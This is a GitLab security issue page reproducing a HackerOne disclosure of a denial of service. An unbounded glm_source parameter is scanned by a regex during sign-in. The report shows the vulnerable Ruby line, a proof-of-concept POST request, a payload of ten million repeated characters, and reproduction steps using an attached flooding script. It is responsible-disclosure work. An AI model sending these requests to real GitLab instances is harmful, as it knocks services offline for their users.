

[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

# Application-level Denial of Service via sending a large `glm\_source` parameter

âš  **Please read [the process](https://gitlab.com/gitlab-org/release/docs/-/blob/master/general/security/engineer.md) on how to fix security issues before starting to work on the issue. Vulnerabilities must be fixed in a security mirror.**

**[HackerOne report #2634880](https://hackerone.com/reports/2634880)** by `sim4n6` on 2024-08-01, assigned to [@ngeorge1](/ngeorge1 "Nikhil George"):

[Report](#report) | [Attachments](#attachments) | [How To Reproduce](#how-to-reproduce)

## Report

##### Summary

I identified an application-level denial of service that could be triggered remotely by crafting a specific POST request. Sending such a request to a GitLab instance hosted on a VPS under the stress conditions of DoS leads the instance to reboot some process.

Under the hood, the issue comes from this one [line of code](https://github.com/gitlabhq/gitlabhq/blob/c048ff256b66eaeaa9585c3cc59f3ca1acb7caf8/app/controllers/concerns/preferred_language_switcher.rb#L43) only:

```
    locale = params[:glm_source].scan(%r{(\w{2})-(\w{2})}).flatten
```

What happens here is that the incoming **glm\_source** value is being trusted and a scan() method call is immediately operated on it and then flattened. But no limit on the size is set for the incoming data, this is because the developer expected the value to come from a GET's path request with the limitations that applies.

I managed to weaponize a POST request to meet the conditions to run that specific line of code.

The final proof of concept is **similar** to this one:

```
POST /users/sign_in HTTP/1.1
Host: gitlab.example.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Cookie: known_sign_in=WWtQSktNOTFacGJyLzR5K3crR245Qzlyc0ZHbmh1VCt4RnBkTlpjWTA5REUrTld6Wk5LbWZUd2tLOVo0eGtiVkJaRlltcU5FVEMrWklMYkkrMDNyTzFVV3ZBUTRCU2NzR2JpVDJGK3ZIbnhraWwxaFFsQ29HbmxMalhYTjNFdEQtLW5mMCtIY3pJUDZZRWNSVXlLNFRsVnc9PQ%3D%3D--4c7291451ca185d6db75c049f30e023099bcab50; hide_no_ssh_message=false; hide_auto_devops_implicitly_enabled_banner_1=false; hide_auto_devops_implicitly_enabled_banner_2=false; _gitlab_session=93d4a1e92ad912e9993df049b59c0eff____ANYTHING;
Accept-Encoding: gzip, deflate, br
Content-Length: 43

_method=get&glm_source=gitlab.com%2Faa-b%2F

```

What is specific about this ordinary POST request is that it does **marketing\_site\_language** in the following [code](https://github.com/gitlabhq/gitlabhq/blob/c048ff256b66eaeaa9585c3cc59f3ca1acb7caf8/app/controllers/concerns/preferred_language_switcher.rb#L16-L21) :

```
  def preferred_language
    cookies[:preferred_language].presence_in(Gitlab::I18n.available_locales) ||
      selectable_language(marketing_site_language) ||
      selectable_language(browser_languages) ||
      Gitlab::CurrentSettings.default_preferred_language
  end
```

Which means :

1. the **preferred\_language** cookie was deleted from the POST request.
2. the header like **Accept-Language: en-US,en;q=0.5** was deleted too.
3. the user is not logged in as the **\_gitlab\_session** cookie corresponds to anything.

When such a POST request hits a GitLab instance the vulnerable line would be triggered and would scan the value of **glm\_source** for all possible locales (strings like `fr-fr` or `jp-JP` or `en-US`) which means any two letters associated with another two letters separated by a hyphen.

Imagine the impact now, if the following python code is used

```
glm_source = "gitlab.com/" + "aa-bb" * 10_000_000 +  "/"
```

it would scan 10 million characters for duo-duo and flatten them inside a list.

##### Steps to reproduce

1. I set up a VPS instance for Gitlab with the following stress conditions:

[![image.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/af4c894bd70b2dc333a224b4b339b4534bb765c7/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f39363832616633652d323432632d346362352d383638302d6365343736353830623964632f696d6167652e706e67)

to do so:

```
apt-get update
apt-get upgrade -y
apt-get install -y curl openssh-server ca-certificates
curl https://packages.gitlab.com/install/repositories/gitlab/gitlab-ee/script.deb.sh | bash
apt-get update
EXTERNAL_URL="http://gitlab.example.com" apt-get install gitlab-ee
gitlab-ctl reconfigure
```

and

```
###  add the VPS public IP to the local /etc/hosts so that it can recognize gitlab.example.com to point to the GitLab isntance.

nano /etc/hosts

209.38.64.67            gitlab.example.com
```

After a gitlab instance reconfiguration it would take a while and then you can access it at **gitlab.example.com**.

One more details, the **root** admin password is supposed to be printed to the console otherwise

```
cat /etc/gitlab/initial_root_password
```

use that specific login to create a different user if you want (The point of this step is to showcase that the impact of the attack is on all users).

2. I set up a different VPS instance to emulate a separate attacker's instance.

[![image.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/0f1ab7b53bf64c8d85cfb832217d8b21c47a34e9/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f35306661346334612d343363372d343966362d616535342d3066313634613936643865352f696d6167652e706e67)

3. I hosted the file [![send_DoS.py](data:image/gif;base64...)](https://user-content.gitlab-static.net/dc6f653c64ec8b74f0d60031b925e302329a38e8/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f36313234363333632d343366642d343935332d383765372d3839613833316537353662362f73656e645f446f532e7079) in the attacker instance. This python script craft the POST request to hit an instance located at **209.38.64.67** with a command similar to :

```
python3 send_DoS.py 10_000_000
```

for that to be successful, you need to install the python module **aiohttp** on the attacker instance with `pip3 install aiohttp`

##### Impact

When you run the **send\_DoS.py** file on the separate attacker's instance, you shall get something similar to :

[![Screenshot_from_2024-08-01_11-48-24.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/d7d75e9512c1ef417346f4c2bfb3a07d582bad8b/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f62336365366337642d623432652d346631362d616535382d3861366238306531663033372f53637265656e73686f745f66726f6d5f323032342d30382d30315f31312d34382d32342e706e67)

The 20 requests sent a minute or so, successfully caused a denial of service.

[![Screenshot_from_2024-08-01_11-48-35.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/066d9df07d5cd20b7d00e0ad69dbbc8d20ccf70d/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f36653432653561372d383932632d346263382d396161302d6637616139653164316632372f53637265656e73686f745f66726f6d5f323032342d30382d30315f31312d34382d33352e706e67)[![Screenshot_from_2024-08-01_11-49-01.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/c528ab64c3a97353440f5f77334b695e17e46b8c/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f32663733366565332d366564392d343161612d626531362d3134366630343065393831362f53637265656e73686f745f66726f6d5f323032342d30382d30315f31312d34392d30312e706e67)

##### Examples

* If the bug is project related, please create an example project and export it using the project export feature: **nope**
* If you are using an older version of GitLab, this will also help determine whether the bug has been fixed in a more recent version: **latest**.
* If the bug can be reproduced on GitLab.com without violating the `Rules of Engagement` as outlined in the program policy, please provide the full path to the project.: **I did not engage with gitlab.com** but I am sure it is gonna work.

##### What is the current *bug* behavior?

* it causes a denial of service a complete instance disconnect and reboot.

##### What is the expected *correct* behavior?

* the incoming **glm\_source** value should be limited by a maximum of 1\_000 characters.

##### Relevant logs and/or screenshots

* the screenshots are attached above.

##### Output of checks

* If you are reporting a bug on GitLab.com, write: This bug happens on GitLab.com : **did not test, but I am willing to do so if you want.**

###### Results of GitLab environment info

* For installations with omnibus-gitlab package run and paste the output of:

  `sudo gitlab-rake gitlab:env:info`

```
System information
System:		Ubuntu 24.04
Proxy:		no
Current User:	git
Using RVM:	no
Ruby Version:	3.1.5p253
Gem Version:	3.5.11
Bundler Version:2.5.11
Rake Version:	13.0.6
Redis Version:	7.0.15
Sidekiq Version:7.1.6
Go Version:	unknown

GitLab information
Version:	17.2.1-ee
Revision:	88793996279
Directory:	/opt/gitlab/embedded/service/gitlab-rails
DB Adapter:	PostgreSQL
DB Version:	14.11
URL:		http://gitlab.example.com
HTTP Clone URL:	http://gitlab.example.com/some-group/some-project.git
SSH Clone URL:	git@gitlab.example.com:some-group/some-project.git
Elasticsearch:	no
Geo:		no
Using LDAP:	no
Using Omniauth:	yes
Omniauth Providers:

GitLab Shell
Version:	14.37.0
Repository storages:
- default: 	unix:/var/opt/gitlab/gitaly/gitaly.socket
GitLab Shell path:		/opt/gitlab/embedded/service/gitlab-shell

Gitaly
- default Address: 	unix:/var/opt/gitlab/gitaly/gitaly.socket
- default Version: 	17.2.1
- default Git Version: 	2.45.2

```

#### Impact

Detailed previously.

Regards

[@]sim4n6

## Attachments

**Warning:** Attachments received through HackerOne, please exercise caution!

* [image.png](https://h1.sec.gitlab.net/a/9682af3e-242c-4cb5-8680-ce476580b9dc/image.png)
* [image.png](https://h1.sec.gitlab.net/a/50fa4c4a-43c7-49f6-ae54-0f164a96d8e5/image.png)
* [send\_DoS.py](https://h1.sec.gitlab.net/a/6124633c-43fd-4953-87e7-89a831e756b6/send_DoS.py)
* [Screenshot\_from\_2024-08-01\_11-48-24.png](https://h1.sec.gitlab.net/a/b3ce6c7d-b42e-4f16-ae58-8a6b80e1f037/Screenshot_from_2024-08-01_11-48-24.png)
* [Screenshot\_from\_2024-08-01\_11-48-35.png](https://h1.sec.gitlab.net/a/6e42e5a7-892c-4bc8-9aa0-f7aa9e1d1f27/Screenshot_from_2024-08-01_11-48-35.png)
* [Screenshot\_from\_2024-08-01\_11-49-01.png](https://h1.sec.gitlab.net/a/2f736ee3-6ed9-41aa-be16-146f040e9816/Screenshot_from_2024-08-01_11-49-01.png)

## How To Reproduce

Please add [reproducibility information](https://about.gitlab.com/handbook/engineering/security/#reproducibility-on-security-issues) to this section:

Edited Aug 26, 2024 by [Doug Stull](/dstull)

Assignee
Loading

Time tracking
Loading

Confidentiality

Confidentiality controls have moved to the issue actions menu () at the top of the page.

